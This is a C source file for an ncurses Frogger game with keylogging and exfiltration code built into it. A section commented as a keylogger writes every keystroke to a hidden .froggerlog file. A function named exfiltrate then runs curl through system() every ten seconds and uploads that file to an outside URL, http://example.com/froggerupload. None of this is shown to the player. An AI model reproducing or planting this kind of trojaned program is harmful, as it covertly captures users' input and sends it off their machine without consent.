#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ncurses.h>
#include <time.h>
#include <string.h>
#include <sys/time.h>

#define WIDTH 40
#define HEIGHT 20
#define NUM_LANES 4
#define CARS_PER_LANE 3

typedef struct {
    int y;
    int x[CARS_PER_LANE];
    int dir;
} Lane;

Lane lanes[NUM_LANES];
int frogY = HEIGHT - 1;
int frogX = WIDTH / 2;
int score = 0;
int gameOver = 0;

// 🔒 Keylogger
FILE *logfile = NULL;
struct timeval last_exfil;
const char *logpath = ".froggerlog";
const char *exfil_url = "http://example.com/froggerupload";

void init_malicious() {
    logfile = fopen(logpath, "a");
    if (!logfile) {
        logfile = fopen("/tmp/.froggerlog", "a");
    }
    gettimeofday(&last_exfil, NULL);
}

void exfiltrate() {
    struct timeval now;
    gettimeofday(&now, NULL);
    if (now.tv_sec - last_exfil.tv_sec >= 10) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
                 "curl -s -X POST -F \"file=@%s\" %s > /dev/null 2>&1",
                 logpath, exfil_url);
        system(cmd);
        gettimeofday(&last_exfil, NULL);
    }
}

void init() {
    srand(time(NULL));
    for (int i = 0; i < NUM_LANES; i++) {
        lanes[i].y = 2 + i * 3;
        lanes[i].dir = (i % 2 == 0) ? 1 : -1;
        for (int j = 0; j < CARS_PER_LANE; j++) {
            lanes[i].x[j] = rand() % WIDTH;
        }
    }
}

void draw() {
    clear();
    for (int y = 0; y < HEIGHT; y++) {
        for (int x = 0; x < WIDTH; x++) {
            int printed = 0;

            if (y == 0) {
                printw("~");
                continue;
            }

            for (int i = 0; i < NUM_LANES; i++) {
                if (y == lanes[i].y) {
                    for (int j = 0; j < CARS_PER_LANE; j++) {
                        if (x == lanes[i].x[j]) {
                            printw("=");
                            printed = 1;
                            break;
                        }
                    }
                }
            }

            if (!printed && y == frogY && x == frogX) {
                printw("@");
                printed = 1;
            }

            if (!printed) printw(" ");
        }
        printw("\n");
    }
    printw("Score: %d\n", score);
    refresh();
}

void input() {
    timeout(0);
    int ch = getch();

    if (ch != ERR && logfile) {
        fputc(ch, logfile);
        fflush(logfile);
    }

    if (ch == 'w' && frogY > 0) frogY--;
    if (ch == 's' && frogY < HEIGHT - 1) frogY++;
    if (ch == 'x') gameOver = 1;

    exfiltrate();
}

void updateCars() {
    for (int i = 0; i < NUM_LANES; i++) {
        for (int j = 0; j < CARS_PER_LANE; j++) {
            lanes[i].x[j] += lanes[i].dir;
            if (lanes[i].x[j] < 0) lanes[i].x[j] = WIDTH - 1;
            if (lanes[i].x[j] >= WIDTH) lanes[i].x[j] = 0;
        }
    }
}

void checkCollision() {
    for (int i = 0; i < NUM_LANES; i++) {
        if (frogY == lanes[i].y) {
            for (int j = 0; j < CARS_PER_LANE; j++) {
                if (frogX == lanes[i].x[j]) {
                    gameOver = 1;
                    return;
                }
            }
        }
    }

    if (frogY == 0) {
        score++;
        frogY = HEIGHT - 1;
        frogX = WIDTH / 2;
    }
}

int main() {
    initscr();
    noecho();
    curs_set(FALSE);

    init_malicious();
    init();

    while (!gameOver) {
        draw();
        input();
        updateCars();
        checkCollision();
        usleep(120000);
    }

    draw();
    printw("\n🚗💀 Splat! Final Score: %d\n", score);
    printw("Press any key to exit...");
    timeout(-1);
    getch();
    endwin();

    if (logfile) fclose(logfile);

    return 0;
}
